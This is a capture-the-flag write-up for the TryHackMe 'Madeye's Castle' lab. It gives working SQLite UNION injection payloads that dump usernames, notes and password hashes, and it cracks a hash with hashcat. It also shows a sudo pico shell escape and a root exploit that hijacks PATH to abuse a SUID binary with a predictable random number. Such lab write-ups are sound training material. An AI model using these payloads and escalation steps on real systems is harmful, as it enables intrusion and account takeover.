---
layout: post
author: Razor
title: "Tryhackme Madeye's Castle"
categories: [Tryhackme, Linux]
tags: [cracking, reversing binary, enumeration, custom exploitation, sql injection, medium-box, boot2root ,privilage escalation]     # TAG names should always be lowercase
image: assets/thm-madeye-castle/bg.png
toc: true
---


## Introduction
in this room we will do a lot of enumeration , gain a foothold, pivot around to a few different users, etc . You can see the room right here [https://tryhackme.com/room/madeyescastle](https://tryhackme.com/room/madeyescastle)

## Enumeration

### Nmap
what we have to do first is scanning the ip :
> $ sudo nmap -sC -sV 10.10.185.66

```bat
# Nmap 7.91 scan initiated Mon Feb  1 13:01:15 2021 as: nmap -sC -sV -oA nmap hogwarts-castle.thm
Nmap scan report for hogwarts-castle.thm (10.10.128.52)
Host is up (0.34s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:5f:48:fa:3d:3e:e6:9c:23:94:33:d1:8d:22:b4:7a (RSA)
|   256 53:75:a7:4a:a8:aa:46:66:6a:12:8c:cd:c2:6f:39:aa (ECDSA)
|_  256 7f:c2:2f:3d:64:d9:0a:50:74:60:36:03:98:00:75:98 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -4s, deviation: 1s, median: -5s
|_nbstat: NetBIOS name: HOGWARTZ-CASTLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: hogwartz-castle
|   NetBIOS computer name: HOGWARTZ-CASTLE\x00
|   Domain name: \x00
|   FQDN: hogwartz-castle
|_  System time: 2021-02-01T06:01:41+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-01T06:01:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb  1 13:02:26 2021 -- 1 IP address (1 host up) scanned in 70.50 seconds
```
### SMB
As you can see in nmap we have port open 139,445 which is it is smb share, then lets using smbmap for enumration smb

```bat
smbmap -H 10.10.185.66 -R                                                                                                                                   130 ⨯
[+] Guest session       IP: 10.10.185.66:445    Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        sambashare                                              READ ONLY       Harry's Important Files
        .\sambashare\*
        dr--r--r--                0 Thu Nov 26 08:19:19 2020    .
        dr--r--r--                0 Thu Nov 26 07:57:55 2020    ..
        fr--r--r--              874 Thu Nov 26 08:06:32 2020    spellnames.txt
        fr--r--r--              147 Thu Nov 26 08:19:19 2020    .notes.txt
        IPC$                                                    NO ACCESS       IPC Service (hogwartz-castle server (Samba, Ubuntu))
```
There is some share with default setting which is everyone can access it. 
```bat 
smbclient //10.10.185.66/sambashare                                                                        1 ⨯
Enter WORKGROUP\razor's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 08:19:20 2020
  ..                                  D        0  Thu Nov 26 07:57:55 2020
  spellnames.txt                      N      874  Thu Nov 26 08:06:32 2020
  .notes.txt                          H      147  Thu Nov 26 08:19:19 2020

                9219412 blocks of size 1024. 4413488 blocks available
smb: \> get spellnames.txt
getting file \spellnames.txt of size 874 as spellnames.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \> get .notes.txt 
getting file \.notes.txt of size 147 as .notes.txt (0.1 KiloBytes/sec) (average 0.4 KiloBytes/sec)

```
now we have 2 file from smbshare lets checkit 
- spellnames.txt 
```
avadakedavra
crucio
imperio
-
-
-
incendio
evanesco
aguamenti
```
- .notes.txt 
```
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
```
### Gobuster

now after enumeration we can scanning webserver especially for directory open 
```bat
gobuster dir -u 10.10.185.66 -w /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.185.66
[+] Threads:        10
[+] Wordlist:       /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/10 18:27:24 Starting gobuster
===============================================================
/backup (Status: 301)
```
if you dont have wordlist you can download right here : [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

- we found backup directory, now lets scan again to directory backup ("-u 10.10.185.66/backup ")
```
2021/02/10 18:31:43 Starting gobuster
===============================================================
/email (Status: 200)
```
then we found email, lets check it

![Background](/assets/thm-madeye-castle/bg_2.png)
we have message from this directory, then lets check the source code webserver

![Background](/assets/thm-madeye-castle/bg_3.png)

We found hosts on source code, now lets put this on /etc/hosts
```bat
$ sudo nano /etc/hosts

127.0.0.1       localhost
127.0.1.1       Razor

10.10.185.66 hogwartz-castle.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
now lets go to http://hogwartz-castle.thm
![Background](/assets/thm-madeye-castle/bg_4.png)

then we found login form
## Exploit 
First i'm try to using sql map doesn't working but there give us some hint.
### SQL Injection
![Background](/assets/thm-madeye-castle/sql.png)

lets check manually and to make it easier we can use burp suite like this :

![Background](/assets/thm-madeye-castle/bg_5.png)

then send it to repeater 

![Background](/assets/thm-madeye-castle/bg_6.png)

in sqlmap give the hint that is UNION injectable with 4 colloums, now put command sql injection to username : 

```
razor' UNION ALL SELECT NULL,NULL,NULL,NULL--
```
and here the result : 
![Background](/assets/thm-madeye-castle/sql_2.png)

here I am trying to send null values to 4 columns and get an error, so there are 4 columns where column 1 and 4 are injectable username and password. we can identify the column for the user and password in 1 and 4. The result :
```
razor' UNION ALL SELECT 1,2,3,4--
```
![Background](/assets/thm-madeye-castle/sql_1.png)

After that we can check the version in column 1 or 4 or both. if you don't know that you can read in [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification) and command for sqlite in [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) . then using this command : 

```
razor'UNION ALL SELECT sqlite_version(),2,3,sqlite_version()--
```
![Background](/assets/thm-madeye-castle/sql_3.png)

then lets find table name : `users`, to find that you need this command : 

```
razor' UNION ALL SELECT sql,2,3,4 FROM sqlite_master WHERE tbl_name= 'users' AND type = 'table'--
```
![Background](/assets/thm-madeye-castle/sql_4.png)

Now we find the contents of all the column including username, password, admin, and notes . but the problem is we can only see 1 username and 1 password, and I tried selecting everything from table using * and the result was an error

```
razor' UNION ALL SELECT name,2,3,password FROM users--
```
![Background](/assets/thm-madeye-castle/sql_5.png)

but if we check the columns of table we have 40 colomns which is there are a lot of user and password 

```
razor'UNION ALL SELECT COUNT(name),2,3,COUNT(password) FROM users--
```
![Background](/assets/thm-madeye-castle/sql_6.png)

now after i'm searching and I found this article [here](https://sqlite.org/lang_aggfunc.html) which helps me to extract the contents from the table column. in that site we can use group_concat() to see all of table : 

```
razor'UNION ALL SELECT group_concat(name),2,3,COUNT(password) FROM users--
```
![Background](/assets/thm-madeye-castle/sql_7.png)

And for The notes : 
```
razor'UNION ALL SELECT group_concat(notes),2,3,COUNT(password) FROM users--
```
![Background](/assets/thm-madeye-castle/sql_8.png)

now when we align the name and notes it will look like this :

![Background](/assets/thm-madeye-castle/sql_9.png)

from the picture we can conclude that user harry uses a password with best64

## Cracking Hash

- first we have file `spellnames.txt` 
- then we have a hint that the password used is best64 where we can use the best64 hashcat rule 
``` 
hashcat -D 2 --stdout -r /usr/share/hashcat/rules/best64.rule spellnames.txt new_crackabel
```
- Indentify type of hash 
```
hash-identifier b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885
--------------------------------------------------
Possible Hashs:
[+] SHA-512
[+] Whirlpool
Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
--------------------------------------------------
```

Now we just crack the password 

```bat 
$ hashcat -D 2 -m 1700 'b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885' new_crackabel
hashcat (v6.1.1) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
* Device #2: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
CUDA API (CUDA 11.2)
====================
* Device #1: GeForce GTX 950, 1501/2001 MB, 6MCU

OpenCL API (OpenCL 1.2 CUDA 11.2.136) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #2: GeForce GTX 950, skipped

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
=============================================================================================================================
* Device #3: pthread-Intel(R) Pentium(R) Gold G5400 CPU @ 3.70GHz, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

INFO: All hashes found in potfile! Use --show to display them.

Started: Wed Feb 10 22:48:58 2021
Stopped: Wed Feb 10 22:48:59 2021

$ hashcat -D 2 -m 1700 'b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885' new_crackabel --show
b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:wingardiumleviosa123

```
## User escalation

### User1

Now we have first user, now lets jump in to ssh : 
```bat
ssh harry@10.10.185.66

harry@hogwartz-castle:~$ id
uid=1001(harry) gid=1001(harry) groups=1001(harry)
harry@hogwartz-castle:~$ ls
user1.txt
harry@hogwartz-castle:~$ cat user1.txt 
RME{t----------------------------------c}
harry@hogwartz-castle:~$ 
```
### User2

now lets check privilage of harry
```
harry@hogwartz-castle:~$ sudo -l
[sudo] password for harry: 
Matching Defaults entries for harry on hogwartz-castle:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry may run the following commands on hogwartz-castle:
    (hermonine) /usr/bin/pico
    (hermonine) /usr/bin/pico
harry@hogwartz-castle:~$ 
```
Then check /usr/bin/pico and its a nano, now we can exploit it to user hermonine and use gtfobins [here](https://gtfobins.github.io/gtfobins/nano/#sudo)
```
sudo -u hermonine /usr/bin/pico
^R^X
reset; sh 1>&0 2>&0
```
here the shell condition is not good but it doesn't matter and we can still use it
```
$ cd
sh: 6: cd: can't cd to /home/harry
$ bash -i               
bash: /home/harry/.bashrc: Permission denied
hermonine@hogwartz-castle:~$ export TERM=xterm
hermonine@hogwartz-castle:~$ cd /home/hermonine/
hermonine@hogwartz-castle:/home/hermonine$ ls
user2.txt
hermonine@hogwartz-castle:/home/hermonine$ cat user2.txt 
RME{p--------------------------------------6}
hermonine@hogwartz-castle:/home/hermonine$ id
uid=1002(hermonine) gid=1002(hermonine) groups=1002(hermonine)
hermonine@hogwartz-castle:/home/hermonine$
```
### Exploit Root

Lets check SUID permission with this command : 
```bat
hermonine@hogwartz-castle:/home/hermonine$ find / -perm -u=s -type f 2>/dev/null
/srv/time-turner/swagger
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/bin/umount
/bin/fusermount
/bin/su
/bin/ping
/bin/mount
hermonine@hogwartz-castle:/home/hermonine$
```
then we have found swagger access for the hermonine user,
now if you dont know how to get swagger to your machine you can read here :
```
first you can copy that to /tmp 
and you can use scp tools and following this 

Victim : 

hermonine@hogwartz-castle:/home/hermonine$ cp /srv/time-turner/swagger /tmp
hermonine@hogwartz-castle:/home/hermonine$ cd /tmp/
hermonine@hogwartz-castle:/tmp$ ls
swagger

Hacker (Your Machines):

$ scp harry@10.10.185.66:/tmp/swagger ./swagger 
harry@10.10.185.66's password: 
swagger                                                                          100% 8816    24.3KB/s   00:00
```

then we can use ghidra for see main function of swagger, lets check in function section main :

```bat
undefined8 main(void)

{
  time_t tVar1;
  long in_FS_OFFSET;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  local_14 = rand();
  printf("Guess my number: ");
  __isoc99_scanf(&DAT_00100b8d,&local_18);
  if (local_14 == local_18) {
    impressive();
  }
  else {
    puts("Nope, that is not what I was thinking");
    printf("I was thinking of %d\n",(ulong)local_14);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
Check in function section impresive :
```bat
void impressive(void)

{
  setregid(0,0);
  setreuid(0,0);
  puts("Nice use of the time-turner!");
  printf("This system architecture is ");
  fflush(stdout);
  system("uname -p");
  return;
}
```
The logic of this program is that when you guess the correct number, the impresive () function will execute the uname command and,here we can execute the binary "uname -p" which is where we can manipulate path variables and can pass malicious code
resource for rand() [here](https://man7.org/linux/man-pages/man3/rand.3.html) 

[srand()](https://www.programiz.com/cpp-programming/library-function/cstdlib/srand) : The srand() function in C++ seeds the pseudo random number generator used by the rand() function. The seed for rand() function is 1 by default. It means that if no srand() is called before rand(), the rand() function behaves as if it was seeded with srand(1) and the rand() value always generated same.

[time()](https://www.geeksforgeeks.org/time-function-in-c/) : The time() function is defined in time.h (ctime in C++) header file. This function returns the time since 00:00:00 UTC, January 1, 1970 (Unix timestamp) in seconds

lets executes a binary called uname ,  if we run swagger program with same logic we get the same value multiple time.
```
hermonine@hogwartz-castle:/tmp$ for i in $(seq 1 10);do echo "razor" | ./swagger ;done;
Guess my number: Nope, that is not what I was thinking
I was thinking of 1144253117
Guess my number: Nope, that is not what I was thinking
I was thinking of 1144253117
Guess my number: Nope, that is not what I was thinking
I was thinking of 1144253117
Guess my number: Nope, that is not what I was thinking
I was thinking of 1144253117
Guess my number: Nope, that is not what I was thinking
I was thinking of 1144253117
Guess my number: Nope, that is not what I was thinking
I was thinking of 1144253117
Guess my number: Nope, that is not what I was thinking
I was thinking of 1144253117
Guess my number: Nope, that is not what I was thinking
I was thinking of 1144253117
Guess my number: Nope, that is not what I was thinking
I was thinking of 1144253117
Guess my number: Nope, that is not what I was thinking
I was thinking of 1144253117
hermonine@hogwartz-castle:/tmp$
```
when stopping the rand () function. The first time you need to do is take the first executable rand () value and enter the second execute value.
now lets create binary at /tmp and add /tmp to $PATH, doing this for getting root privilage using path variable
```
hermonine@hogwartz-castle:/tmp$ touch uname
hermonine@hogwartz-castle:/tmp$ echo "sudo usermod -aG sudo harry" > uname
hermonine@hogwartz-castle:/tmp$ export PATH=/tmp:$PATH
hermonine@hogwartz-castle:/tmp$ chmod +x uname
```
that code in will add user harry to sudo group when /srv/time-turner/swagger will be executed

```
hermonine@hogwartz-castle:/tmp$ /srv/time-turner/swagger|grep -Eo '[^ ]+$' |tail -1| /srv/time-turner/swagger 
whoami
Guess my number: Nice use of the time-turner!
This system architecture is hermonine@hogwartz-castle:/tmp$ su harry
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

harry@hogwartz-castle:/tmp$ sudo su root
[sudo] password for harry: 
root@hogwartz-castle:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@hogwartz-castle:/tmp# cat /root/root.txt 
RME{M------------------------------f}
root@hogwartz-castle:/tmp#
```
Happy Hacking :D 